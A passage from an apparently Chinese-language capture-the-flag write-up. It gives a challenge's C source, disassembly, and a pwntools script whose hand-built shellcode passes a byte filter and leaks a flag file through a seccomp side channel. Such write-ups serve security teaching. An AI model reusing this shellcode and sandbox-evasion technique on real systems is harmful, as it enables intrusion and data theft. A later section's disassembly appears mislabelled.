  401669:	41 89 fc             	mov    r12d,edi
  40166c:	55                   	push   rbp
  40166d:	48 8d 2d 94 47 00 00 	lea    rbp,[rip+0x4794]        # 405e08 <__do_global_dtors_aux_fini_array_entry>
  401674:	53                   	push   rbx
  401675:	4c 29 fd             	sub    rbp,r15
  401678:	48 83 ec 08          	sub    rsp,0x8
  40167c:	e8 7f f9 ff ff       	call   401000 <_init>
  401681:	48 c1 fd 03          	sar    rbp,0x3
  401685:	74 1f                	je     4016a6 <__libc_csu_init+0x56>
  401687:	31 db                	xor    ebx,ebx
  401689:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
  401690:	4c 89 f2             	mov    rdx,r14
  401693:	4c 89 ee             	mov    rsi,r13
  401696:	44 89 e7             	mov    edi,r12d
  401699:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
  40169d:	48 83 c3 01          	add    rbx,0x1
  4016a1:	48 39 dd             	cmp    rbp,rbx
  4016a4:	75 ea                	jne    401690 <__libc_csu_init+0x40>
  4016a6:	48 83 c4 08          	add    rsp,0x8
  4016aa:	5b                   	pop    rbx
  4016ab:	5d                   	pop    rbp
  4016ac:	41 5c                	pop    r12
  4016ae:	41 5d                	pop    r13
  4016b0:	41 5e                	pop    r14
  4016b2:	41 5f                	pop    r15
  4016b4:	c3                   	ret    
  4016b5:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4016bc:	00 00 00 00 

00000000004016c0 <__libc_csu_fini>:
  4016c0:	f3 0f 1e fa          	endbr64 
  4016c4:	c3                   	ret    

Disassembly of section .fini:

00000000004016c8 <_fini>:
  4016c8:	f3 0f 1e fa          	endbr64 
  4016cc:	48 83 ec 08          	sub    rsp,0x8
  4016d0:	48 83 c4 08          	add    rsp,0x8
  4016d4:	c3                   	ret    

```
</details>

<details><summary>hint code</summary>

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <seccomp.h>
#include <linux/seccomp.h>

void init()
{
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	return;
}

void init_seccomp()
{
	scmp_filter_ctx ctx;
	ctx = seccomp_init(SCMP_ACT_KILL);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
	seccomp_load(ctx);
}

void banner()
{
	puts("⡟⢹⣿⡿⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⣿⣿⠉⠛⣿⣿⣿⣿⠋⠉⠉⡟⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡟⠉⠉⣻⣿⣿⣿⣿⠛⡛⠉⠉⣿⣿⠋⠉⠉⠉⠉⠉⠉⠉⠉⢻");
	puts("⣷⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⣀⠛⠁⠀⢹⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⢠⣿⣿⣿⠟⢁⣼⣤⣤⣼⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠛⠉⢩⡀⡠⠀⣼⠇⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⡀⢀⠇⠀⢀⣾⣿⡿⠁⣠⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠚⠉⠀⠀⠀⠀⢹⡿⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⢀⠌⠛⢫⡤⠞⢿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⡟⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⠁⠀⠀⠀⠀⠀⢀⡴⠊⠀⠀⡠⠊⠀⠀⢀⠔⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⠀⠃⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⢀⡾⠀⠀⠀⠀⠁⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⡄⢀⣴⠋⠀⠀⠀⠀⠀⠀⢀⣴⡿⠄⠀⢀⣠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣄⠀⢸");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣥⠖⠀⠀⠀⣀⣀⣤⣿⣿⣱⠁⢀⣾⣟⣠⣄⣞⡄⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡄⢸");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣷⣶⣿⠿⢿⣿⣿⣿⣿⣿⡀⣼⣿⣿⣿⣿⡟⠀⠀⠀⢠⡦⠀⣼⣇⠀⠘⣆⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⣾");
	puts("⡇⠀⠀⣠⣴⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⣸⠃⢀⣿⣿⡇⠀⣿⡀⠀⠀⠀⡀⠀⣆⠸⡆⠀⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿");
	puts("⡇⢀⣜⣵⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠳⠀⠙⢸⡏⠐⣾⡏⣿⣧⠀⢸⣇⣄⠀⠀⢳⠀⢻⠠⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿");
	puts("⣧⡜⣴⠏⠀⢸⣿⣿⠿⠛⠛⠉⠉⠁⠀⠀⢰⣿⣿⣿⢻⣿⣿⣿⣿⠟⠛⢡⡿⠁⢠⠂⢲⡟⠒⣤⠏⠀⣿⣿⠀⠈⣿⠹⣧⠀⢸⣆⣸⣾⣿⣿⠟⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻");
	puts("⣿⣿⠃⠀⠀⣿⣿⣿⣿⣶⣦⣴⣴⣶⣤⣶⣾⠃⢸⣿⠈⣿⢹⡟⡟⠀⠀⣸⢃⡠⠁⢠⡟⢀⣰⣿⡇⠀⢿⢻⠀⠀⢸⡄⣷⠀⠐⣿⢿⣿⣿⣿⠀⢘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⠃⠀⠀⢠⣿⣿⣿⣿⣿⣿⡿⠿⠿⠟⠻⣿⠀⣿⡇⢠⡏⢸⣇⡇⠀⠀⣿⣿⠃⣠⠟⢠⣾⠟⠉⠀⠀⢸⣼⡇⠀⠸⣇⢸⠀⠀⣸⠈⣿⣿⣿⣴⣿⣿⠀⠀⠀⢠⣴⡀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣤⣠⢀⡾⠁⠹⣿⣿⣿⣿⣿⣿⣷⣶⣼⡇⢸⣿⡅⢸⠃⢸⣿⠇⠀⠀⣿⣥⣾⣯⡼⠋⠁⠀⠀⠀⠀⠸⡟⢷⠀⠀⢻⡮⠄⠀⣹⠀⡟⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⡿⣣⡾⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⡇⣾⣿⡇⣾⠀⠈⣿⡇⠀⠠⡟⠋⠉⠋⠒⠢⢤⡀⠀⠀⠀⠀⣷⠸⡇⠀⠈⣇⡇⠀⢸⠀⣇⡏⣿⣿⣿⢿⠷⡦⣼⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣾⣿⠷⣶⣶⠦⠬⢿⣿⣿⣿⣿⣮⡛⢿⡇⣛⣙⣃⡿⠀⠀⢿⣿⣆⠀⣷⣶⠾⠿⢿⣶⣦⡁⠀⠀⠀⠀⠘⠀⢿⠀⠀⢹⣷⠀⢻⢸⣿⡇⣿⠈⠉⢸⡄⠀⠀⠹⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣉⣤⣶⡿⡟⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⡇⠀⢀⣬⣿⠻⣆⠘⢂⠀⠀⠀⠀⠉⠃⠀⠀⠀⠀⠀⠀⠘⠃⠶⠦⢽⠄⡌⢸⡿⢠⡏⠀⠀⣸⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⡿⠛⠉⣰⠁⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⢸⣽⠀⣹⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⢷⣦⣄⠀⠃⣸⠇⣼⠇⠀⠀⣿⠀⠀⠀⠀⢸⣄⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠸⡏⠀⠻⢿⡿⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣦⢠⡟⢠⡟⠀⠀⠀⣿⠀⠀⠀⠀⢸⡏⠛⠳⢤⡀⠀⠀⠀⠀⢸");
	puts("⡿⠛⠉⠀⠀⠀⠀⠀⠀⢠⣶⡄⠈⢿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡄⠀⢙⡿⣠⣿⡇⠀⠀⣰⣿⠀⠀⠀⠀⢸⣿⠀⠀⠀⠉⠲⣶⣶⣤⣼");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⠀⠀⠻⣿⣿⣿⣿⣿⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣦⣂⠀⠀⠀⠀⠀⠀⣿⡷⢀⣾⣿⡿⣳⠀⠀⡇⣿⣿⡄⠀⠀⠀⣿⣿⡀⠀⠀⠀⠀⠘⣿⣿⣿");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣧⣤⣤⣿⣿⣿⣿⣿⢠⠠⢴⢺⣆⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣷⣿⠆⠀⠀⠈⠀⣸⣿⠟⡇⠋⠀⢸⢱⠙⠻⢷⣄⣠⣾⣿⣿⡇⢰⡀⠀⠀⠀⣿⣿⣿");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣾⣿⣷⣄⠀⠀⠀⠀⠀⠀⠈⠛⠿⢿⡿⠿⠋⠀⠀⠀⠀⢰⣿⡄⢠⠀⠀⠀⣿⡎⠀⢀⣴⣿⣿⣿⣿⣿⡇⢸⣇⠀⠀⠀⣿⣿⣿");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⠇⣜⡄⠀⢀⣿⣇⣴⣿⣿⣿⣿⣿⣿⣿⠇⢸⣿⡀⠀⠀⣿⣿⣿");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢉⡿⠟⠉⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⢀⣀⣤⣴⠚⠛⠋⠉⠀⠀⣿⣷⣴⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢰⣼⣿⣷⣾⣿⡿⠟⢻");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡖⠉⠀⠀⠀⠀⠀⠀⢻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣷⠶⠞⠋⠉⠀⠀⠀⠓⢤⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⢸");
	puts("⡇⠀⣠⣦⠀⠀⠀⠀⠀⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠈⣿⡏⢉⠽⠟⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⢸⣿⣿⣿⣿⢿⣿⣿⣿⠿⢿⣿⣿⡿⢿⣿⣿⣿⣿⡿⠁⠙⢄⢸");
	puts("⡇⢰⣿⣿⠀⠀⠀⠀⢰⡯⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⣾⣿⣿⣿⡇⠸⢿⣿⡄⠀⣼⣿⣻⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⢿");
	puts("⣷⣾⣿⠏⠀⠀⠀⠀⡼⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⣿⣿⣿⣿⠀⠁⠘⣿⣧⣴⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⢸");
	puts("⣿⣿⣿⣷⡀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⠋⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⡘⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⣸");
	puts("⣿⣿⣿⡿⠃⠀⣠⠔⠻⣷⣄⡀⠀⠀⠀⠀⢰⡿⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠻⣼⠱⠁⠘⠿⣿⣿⣿⡟⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣿");
	puts("⡿⠋⠉⠀⢀⡞⠁⠀⠀⠈⠉⠙⠲⠶⣄⣀⣿⡇⠀⠀⠀⠀⢃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠀⠀⡿⠁⠀⠀⠀⠀⠉⠹⡇⠉⠻⣿⣿⣿⠃⠀⠀⠀⠀⡀⠀⢸");
	puts("⡇⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⡏⠀⠀⠀⠀⠀⠀⠀⠤⣀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⣀⣠⣤⠖⠋⢸⣿⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠸⢿⣿⡆⠀⠀⠀⣴⣿⣄⣸");
	puts("⣧⣀⣀⣼⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣸⣤⣤⣀⣀⣀⣼⣀⣀⣁⣀⣀⣀⣠⣤⣤⣶⣶⣶⣿⣟⣉⣉⣁⣀⣀⣀⣼⣿⣤⣦⣼⣦⣀⣀⣀⣀⣀⣀⣀⣀⣴⣥⣤⣭⣷⣤⣤⣾⣿⣿⣿⣿");
}

int main()
{
	init();
	banner();
	char ans[4], squeak[] = "pekopekopekopekopekopekopekopekopekopekopekopekopekopekopekopeko";

	puts("I think pekora is the best VTuber. Isn't it?");
	scanf("%3s", ans);

	if (strncmp(ans, "yes", 3))
	{
		puts("poor guy....");
		exit(0);
	}
	else
		puts("You will pass the course.");

	init_seccomp();

	read(0, squeak, 64);

	int i;

	for (i = 0; i < 64; i++)
	{
		if (i % 11 == 5 && squeak[i] != '\x87')
		{
			exit(0);
		}
	}

	void (*func)() = (void (*)())squeak;
	(*func)();

	return 0;
}
```
</details>

**key concept :** <font color = #FF0080 >shellcode、only read/open的限制</font>

**突破點 :** 

1. 輸入yes 避開進入 exit(0)，和peko很像。
2. 第一次的輸入需要符合與peko這題一樣的規則(確保在遇到「第6個輸入」和從		「第6開始每隔11的char」要是’\x87’)，而依照這個規則，輸入一段「寫入		shellcode到stack其他地方」的shellcode
3. 程式執行到我們寫的shellcode後，再寫入一段程式碼內容為：
    「開啟並讀取 /home/pekopeko/flag 檔案內容 →
        讀取 flag 內第 i 個字元 → 
        輸入字串 guest，並用迴圈和 flag[i] 比較
        If 輸入字串內有和flag[i] 相同的的字元：exit()
        Else 等待」
4. 依照我們的程式，如果發現flag內和我們guest的flag有相同的char，則程		式會顯示Exit()。所以我們將所有有可能的char都輸入一遍，一個一個猜			flag的char。
5. payload
```python 
from pwn import *
import struct
context.arch = "amd64"
# p = remote('140.115.59.7',10008)
p = process('pekopeko_distribute/share/pekopeko')

p.send(flat(b"yes"))

p.send(		# input shell code
	flat(b"\x48\x31\xD2\x80\xC1\x87\x48\x8D\xB5\x00\xFF\xFF\xFF\xB1\x87\xB1\x87\xB2\x90\xB8\x10\x11\x40\x00\xB1\x87\xB1\x87\x48\x31\xC9\xFF\xD0\x48\x83\xEC\x70\xB1\x87\x48\x83\xEC\x40\xFF\xD6\xB1\x87\x80\xC1\x87\xB1\x87\xB1\x87\x80\xC1\x87\xB1\x87\xB1\x87\x80\xC1\x87"))
# string input
inp=flat(		# read flag X32
    b"\x59\xBF\x6C\x61\x67\x00\x57\x48\xBF\x6B\x6F\x70\x65\x6B\x6F\x2F\x66\x57\x48\xBF\x2F\x68\x6F\x6D\x65\x2F\x70\x65\x57\x48\x31\xF6\x48\x31\xD2\x48\x8D\x3C\x24\xB0\x02\x0F\x05\x48\x31\xFF\x66\xBF\x03\x00\x48\x31\xC0\x66\xBA\x40\x00\x50\x50\x50\x50\x48\x8D\x34\x24\x48\x31\xC0\x0F\x05\xB1\x87",
    	#input compare string
    b"\x48\x31\xD2\xB2\x01\x48\x31\xFF\x57\x57\x57\x57\x57\x48\x8D\x34\x24\xB8\x10\x11\x40\x00\x48\x31\xC9\xFF\xD0",
    	#compare string 
    b"\x0F\xB6\x54\x24\x31\x0F\xB6\x04\x24\x38\xC2",
		# ----------------     -----28(1)
    	#jump
    b"\x48\x8D\x35\x13\x00\x00\x00\x48\x83\xC4\x28\x48\x8D\x9D\x46\xFF\xFF\xFF\x38\xC2\x48\x0F\x44\xDE\x53\xC3\xB0\xE7\x0F\x05",
    	#others
    b"\xB1\x87\xB1\x87"
)
p.send(inp)
p.send(b"a")
p.send(b"_")
p.interactive()
# input shell code
0:  48                      dec    eax
1:  31 d2                   xor    edx,edx
3:  80 c1 87                add    cl,0x87
6:  48                      dec    eax
7:  8d b5 00 ff ff ff       lea    esi,[ebp-0x100]
d:  b1 87                   mov    cl,0x87
f:  b1 87                   mov    cl,0x87
11: b2 90                   mov    dl,0x90
13: b8 10 11 40 00          mov    eax,0x401110
18: b1 87                   mov    cl,0x87
1a: b1 87                   mov    cl,0x87
1c: 48                      dec    eax
1d: 31 c9                   xor    ecx,ecx
1f: ff d0                   call   eax
21: 48                      dec    eax
22: 83 ec 70                sub    esp,0x70
25: b1 87                   mov    cl,0x87
27: 48                      dec    eax
28: 83 ec 40                sub    esp,0x40
2b: ff d6                   call   esi
2d: b1 87                   mov    cl,0x87
2f: 80 c1 87                add    cl,0x87
32: b1 87                   mov    cl,0x87
34: b1 87                   mov    cl,0x87
36: 80 c1 87                add    cl,0x87
39: b1 87                   mov    cl,0x87
3b: b1 87                   mov    cl,0x87
3d: 80 c1 87                add    cl,0x87
#read file
0:  59                      pop    rcx
1:  bf 6c 61 67 00          mov    edi,0x67616c
6:  57                      push   rdi
7:  48 bf 6b 6f 70 65 6b    movabs rdi,0x662f6f6b65706f6b
e:  6f 2f 66
11: 57                      push   rdi
12: 48 bf 2f 68 6f 6d 65    movabs rdi,0x65702f656d6f682f
19: 2f 70 65
1c: 57                      push   rdi
1d: 48 31 f6                xor    rsi,rsi
20: 48 31 d2                xor    rdx,rdx
23: 48 8d 3c 24             lea    rdi,[rsp]
27: b0 02                   mov    al,0x2
29: 0f 05                   syscall
2b: 48 31 ff                xor    rdi,rdi
2e: 66 bf 03 00             mov    di,0x3
32: 48 31 c0                xor    rax,rax
35: 66 ba 40 00             mov    dx,0x40
39: 50                      push   rax
3a: 50                      push   rax
3b: 50                      push   rax
3c: 50                      push   rax
3d: 48 8d 34 24             lea    rsi,[rsp]
41: 48 31 c0                xor    rax,rax
44: 0f 05                   syscall
46: b1 87                   mov    cl,0x87

#input compare string
0:  48 31 d2                xor    rdx,rdx
3:  b2 01                   mov    dl,0x1
5:  48 31 ff                xor    rdi,rdi
8:  57                      push   rdi
9:  57                      push   rdi
a:  57                      push   rdi
b:  57                      push   rdi
c:  57                      push   rdi
d:  48 8d 34 24             lea    rsi,[rsp]
11: b8 10 11 40 00          mov    eax,0x401110
16: 48 31 c9                xor    rcx,rcx
19: ff d0                   call   rax

#input compare string 
0:  0f b6 54 24 31          movzx  edx,BYTE PTR [rsp+0x31]
5:  0f b6 04 24             movzx  eax,BYTE PTR [rsp]

# jump
0:  48 8d 35 13 00 00 00    lea    rsi,[rip+0x13]        # 0x1a
7:  48 83 c4 28             add    rsp,0x28
b:  48 8d 9d 46 ff ff ff    lea    rbx,[rbp-0xba]
12: 38 c2                   cmp    dl,al
if:dl==al(rsi放入rbx) 
else:rbx不動
14: 48 0f 44 de             cmove  rbx,rsi
18: 53                      push   rbx
19: c3                      ret(pop rip)
1a: b0 e7                   mov    al,0xe7
1c: 0f 05                   syscall
```

## Gawr_gura
<details>
<summary>source code</summary>

```x86asm

pekopeko:     file format elf64-x86-64


Disassembly of section .init:

0000000000401000 <_init>:
  401000:	f3 0f 1e fa          	endbr64 
  401004:	48 83 ec 08          	sub    rsp,0x8
  401008:	48 8b 05 e9 4f 00 00 	mov    rax,QWORD PTR [rip+0x4fe9]        # 405ff8 <__gmon_start__>
  40100f:	48 85 c0             	test   rax,rax
  401012:	74 02                	je     401016 <_init+0x16>
  401014:	ff d0                	call   rax
  401016:	48 83 c4 08          	add    rsp,0x8
  40101a:	c3                   	ret    

Disassembly of section .plt:

0000000000401020 <.plt>:
  401020:	ff 35 e2 4f 00 00    	push   QWORD PTR [rip+0x4fe2]        # 406008 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:	f2 ff 25 e3 4f 00 00 	bnd jmp QWORD PTR [rip+0x4fe3]        # 406010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:	0f 1f 00             	nop    DWORD PTR [rax]
  401030:	f3 0f 1e fa          	endbr64 
  401034:	68 00 00 00 00       	push   0x0
  401039:	f2 e9 e1 ff ff ff    	bnd jmp 401020 <.plt>
  40103f:	90                   	nop
  401040:	f3 0f 1e fa          	endbr64 
  401044:	68 01 00 00 00       	push   0x1
  401049:	f2 e9 d1 ff ff ff    	bnd jmp 401020 <.plt>
  40104f:	90                   	nop
  401050:	f3 0f 1e fa          	endbr64 
  401054:	68 02 00 00 00       	push   0x2
  401059:	f2 e9 c1 ff ff ff    	bnd jmp 401020 <.plt>
  40105f:	90                   	nop
  401060:	f3 0f 1e fa          	endbr64 
  401064:	68 03 00 00 00       	push   0x3
  401069:	f2 e9 b1 ff ff ff    	bnd jmp 401020 <.plt>
  40106f:	90                   	nop
  401070:	f3 0f 1e fa          	endbr64 
  401074:	68 04 00 00 00       	push   0x4
  401079:	f2 e9 a1 ff ff ff    	bnd jmp 401020 <.plt>
  40107f:	90                   	nop
  401080:	f3 0f 1e fa          	endbr64 
  401084:	68 05 00 00 00       	push   0x5
  401089:	f2 e9 91 ff ff ff    	bnd jmp 401020 <.plt>
  40108f:	90                   	nop
  401090:	f3 0f 1e fa          	endbr64 
  401094:	68 06 00 00 00       	push   0x6
  401099:	f2 e9 81 ff ff ff    	bnd jmp 401020 <.plt>
  40109f:	90                   	nop
  4010a0:	f3 0f 1e fa          	endbr64 
  4010a4:	68 07 00 00 00       	push   0x7
  4010a9:	f2 e9 71 ff ff ff    	bnd jmp 401020 <.plt>
  4010af:	90                   	nop
  4010b0:	f3 0f 1e fa          	endbr64 
  4010b4:	68 08 00 00 00       	push   0x8
  4010b9:	f2 e9 61 ff ff ff    	bnd jmp 401020 <.plt>
  4010bf:	90                   	nop

Disassembly of section .plt.sec:

00000000004010c0 <seccomp_init@plt>:
  4010c0:	f3 0f 1e fa          	endbr64 
  4010c4:	f2 ff 25 4d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f4d]        # 406018 <seccomp_init>
  4010cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010d0 <strncmp@plt>:
  4010d0:	f3 0f 1e fa          	endbr64 
  4010d4:	f2 ff 25 45 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f45]        # 406020 <strncmp@GLIBC_2.2.5>
  4010db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010e0 <seccomp_rule_add@plt>:
  4010e0:	f3 0f 1e fa          	endbr64 
  4010e4:	f2 ff 25 3d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f3d]        # 406028 <seccomp_rule_add>
  4010eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010f0 <puts@plt>:
  4010f0:	f3 0f 1e fa          	endbr64 
  4010f4:	f2 ff 25 35 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f35]        # 406030 <puts@GLIBC_2.2.5>
  4010fb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401100 <seccomp_load@plt>:
  401100:	f3 0f 1e fa          	endbr64 
  401104:	f2 ff 25 2d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f2d]        # 406038 <seccomp_load>
  40110b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401110 <read@plt>:
  401110:	f3 0f 1e fa          	endbr64 
  401114:	f2 ff 25 25 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f25]        # 406040 <read@GLIBC_2.2.5>
  40111b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401120 <setvbuf@plt>:
  401120:	f3 0f 1e fa          	endbr64 
  401124:	f2 ff 25 1d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f1d]        # 406048 <setvbuf@GLIBC_2.2.5>
  40112b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401130 <__isoc99_scanf@plt>:
  401130:	f3 0f 1e fa          	endbr64 
  401134:	f2 ff 25 15 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f15]        # 406050 <__isoc99_scanf@GLIBC_2.7>
  40113b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401140 <exit@plt>:
  401140:	f3 0f 1e fa          	endbr64 
  401144:	f2 ff 25 0d 4f 00 00 	bnd jmp QWORD PTR [rip+0x4f0d]        # 406058 <exit@GLIBC_2.2.5>
  40114b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

0000000000401150 <_start>:
  401150:	f3 0f 1e fa          	endbr64 
  401154:	31 ed                	xor    ebp,ebp
  401156:	49 89 d1             	mov    r9,rdx
  401159:	5e                   	pop    rsi
  40115a:	48 89 e2             	mov    rdx,rsp
